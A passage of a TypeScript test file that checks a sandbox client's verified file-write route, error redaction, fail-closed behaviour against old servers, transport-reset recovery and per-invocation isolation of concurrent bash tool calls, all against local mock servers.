  const original = { bytes: 8, sha256: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' }
  const result = { bytes: 9, sha256: 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' }
  const request = {
    path: '/workspace/squad/src/large.ts',
    content: Buffer.from('candidate').toString('base64'),
    expectedOriginal: original,
    expectedResult: result,
  }

  async function callWriteVerified(client: SandboxClient, value = request): Promise<unknown> {
    return (client as SandboxClient & { writeVerified(request: typeof value): Promise<unknown> }).writeVerified(value)
  }

  test('sends exact mandatory original and result identities to the dedicated route', async () => {
    let observedPath = ''
    let observedBody: unknown
    const server = Bun.serve({
      hostname: '127.0.0.1',
      port: 0,
      async fetch(incoming) {
        observedPath = new URL(incoming.url).pathname
        observedBody = await incoming.json()
        return Response.json({ bytesWritten: result.bytes, sha256: result.sha256 })
      },
    })
    const client = new SandboxClient(`127.0.0.1:${server.port}`)
    try {
      await callWriteVerified(client)
      expect(observedPath).toBe('/write-verified')
      expect(observedBody).toEqual(request)
    } finally {
      client.close()
      await server.stop(true)
    }
  })

  test('returns the exact verified response byte count and digest', async () => {
    const server = Bun.serve({
      hostname: '127.0.0.1',
      port: 0,
      fetch: () => Response.json({ bytesWritten: result.bytes, sha256: result.sha256 }),
    })
    const client = new SandboxClient(`127.0.0.1:${server.port}`)
    try {
      expect(await callWriteVerified(client)).toEqual({ bytesWritten: 9, sha256: result.sha256 })
    } finally {
      client.close()
      await server.stop(true)
    }
  })

  test('preserves the machine-readable 409 edit conflict and phase', async () => {
    const server = Bun.serve({
      hostname: '127.0.0.1',
      port: 0,
      fetch: () =>
        Response.json(
          { error: 'Edit conflict; candidate was not published', code: 'edit-conflict', phase: 'pre-publication' },
          { status: 409 }
        ),
    })
    const client = new SandboxClient(`127.0.0.1:${server.port}`)
    try {
      const error = await callWriteVerified(client).catch((failure) => failure)
      expect(error).toBeInstanceOf(SandboxHttpError)
      expect(error).toMatchObject({ status: 409, code: 'edit-conflict', phase: 'pre-publication' })
    } finally {
      client.close()
      await server.stop(true)
    }
  })

  test('preserves allowlisted filesystem diagnostics without exposing raw error fields', async () => {
    const server = Bun.serve({
      hostname: '127.0.0.1',
      port: 0,
      fetch: () =>
        Response.json(
          {
            error: 'Atomic write pre-publication operation failed; filesystem error ENOSPC (no-space)',
            code: 'pre-publication',
            phase: 'pre-publication',
            errno: 'ENOSPC',
            filesystemClass: 'no-space',
            path: '/secret/path',
          },
          { status: 500 }
        ),
    })
    const client = new SandboxClient(`127.0.0.1:${server.port}`)
    try {
      const error = await callWriteVerified(client).catch((failure) => failure)
      expect(error).toBeInstanceOf(SandboxHttpError)
      expect(error).toMatchObject({
        status: 500,
        code: 'pre-publication',
        phase: 'pre-publication',
        errno: 'ENOSPC',
        filesystemClass: 'no-space',
      })
      expect(error).not.toHaveProperty('path')
      expect((error as Error).message).not.toContain('/secret/path')
    } finally {
      client.close()
      await server.stop(true)
    }
  })

  test('fails closed against a healthy old server with zero legacy write fallback', async () => {
    const server = Bun.serve({
      hostname: '127.0.0.1',
      port: 0,
      fetch(incoming) {
        if (new URL(incoming.url).pathname === '/healthz') {
          return Response.json({ healthy: true, devboxReady: true, version: 'test', uptimeSeconds: 1 })
        }
        return new Response('Not found', { status: 404 })
      },
    })
    const client = new SandboxClient(`127.0.0.1:${server.port}`)
    const legacyWrite = spyOn(client, 'write')
    try {
      await expect(client.health()).resolves.toMatchObject({ healthy: true })
      const error = (await callWriteVerified(client).catch((failure) => failure as Error)) as Error
      expect(error).toBeInstanceOf(SandboxHttpError)
      expect(error.message).toContain("Restart this agent's sandbox from the agent page, or recreate the squad sandbox")
      expect(Buffer.byteLength(error.message, 'utf8')).toBeLessThanOrEqual(512)
      expect(error.message).not.toContain(request.path)
      expect(error.message).not.toContain(request.content)
      expect(error.message).not.toContain(original.sha256)
      expect(error.message).not.toContain(result.sha256)
      expect(legacyWrite).not.toHaveBeenCalled()
    } finally {
      legacyWrite.mockRestore()
      client.close()
      await server.stop(true)
    }
  })

  test('reports a bounded post-publication response identity mismatch without success', async () => {
    let calls = 0
    const server = Bun.serve({
      hostname: '127.0.0.1',
      port: 0,
      fetch() {
        calls += 1
        if (calls === 1) return Response.json({ bytesWritten: result.bytes - 1, sha256: result.sha256 })
        if (calls === 2) return Response.json({ bytesWritten: result.bytes, sha256: 'c'.repeat(64) })
        if (calls === 3) return Response.json(null)
        return new Response('', { headers: { 'content-type': 'application/json' } })
      },
    })
    const client = new SandboxClient(`127.0.0.1:${server.port}`)
    const expectMismatch = (error: Error) => {
      expect(error).toBeInstanceOf(Error)
      expect(error.message).toContain('may have been published')
      expect(error.message).toContain('success was not reported')
      expect(Buffer.byteLength(error.message, 'utf8')).toBeLessThanOrEqual(512)
      expect(error.message).not.toContain(request.path)
      expect(error.message).not.toContain(request.content)
      expect(error.message).not.toContain(original.sha256)
    }
    try {
      const countOnly = (await callWriteVerified(client).catch((failure) => failure as Error)) as Error
      expectMismatch(countOnly)
      const digestOnly = (await callWriteVerified(client).catch((failure) => failure as Error)) as Error
      expectMismatch(digestOnly)
      const missingIdentity = (await callWriteVerified(client).catch((failure) => failure as Error)) as Error
      expectMismatch(missingIdentity)
      const emptySuccess = (await callWriteVerified(client).catch((failure) => failure as Error)) as Error
      expectMismatch(emptySuccess)
      expect(calls).toBe(4)
    } finally {
      client.close()
      await server.stop(true)
    }
  })
})

describe('VM idempotent file transport recovery', () => {
  test('read retries on the recovered client while deterministic write resends identical bytes', async () => {
    const reset = new (await import('../services/sandbox/k8s/http-client')).SandboxTransportError(
      'connection_reset',
      'connect',
      new Error('reset')
    )
    const first = {
      read: mock(async () => {
        throw reset
      }),
      write: mock(async () => {
        throw reset
      }),
    }
    const second = {
      read: mock(async () => ({ content: Buffer.from('hello').toString('base64'), totalSize: 5, isBinary: false })),
      write: mock(async () => ({ bytesWritten: 5 })),
    }
    const manager = {
      getClientForSandbox: () => first,
      getSandboxStatus: async () => ({ status: 'running' }),
      recoverClient: mock(async () => second),
    } as any

    expect((await createHttpReadOperations(manager, 's1').readFile('/workspace/a')).toString()).toBe('hello')
    await createHttpWriteOperations(manager, 's1').writeFile('/workspace/a', 'hello')
    expect(second.write).toHaveBeenCalledWith({
      path: '/workspace/a',
      content: Buffer.from('hello').toString('base64'),
      createDirs: true,
    })
  })
})

test('concurrent consultant commands share a client but retain distinct tokens, scratch roots, and invocation owners', async () => {
  const requests: Array<{ cwd: string; env: Record<string, string>; invocationId: string }> = []
  const manager = {
    getClientForSandbox: () => ({
      bash: (request: (typeof requests)[number]) => {
        requests.push(request)
        const stream = createMockStream()
        queueMicrotask(() => {
          stream.emitData({ exitCode: 0 })
          stream.emitEnd()
        })
        return stream
      },
    }),
    podManager: { namespace: 'tau-sandboxes' },
  } as unknown as K8sSandboxManager
  const sandboxId = 'consultants_squad-one'
  const tools = ['one', 'two'].map(
    (id) =>
      createK8sSandboxedCodingTools('/ignored', sandboxId, manager, `token-${id}`, 'squad-one', `exec-${id}`, id).find(
        (tool) => tool.key === 'bash'
      )!
  )
  await Promise.all(tools.map((tool) => tool.execute('call', { command: 'pwd' })))
  expect(requests.map((request) => request.env.FICUS_TOKEN).sort()).toEqual(['token-one', 'token-two'])
  expect(requests.map((request) => request.cwd).sort()).toEqual(
    ['one', 'two'].map((id) => resolveAgentBashCwd(sandboxId, id)).sort()
  )
  expect(new Set(requests.map((request) => request.invocationId)).size).toBe(2)
})
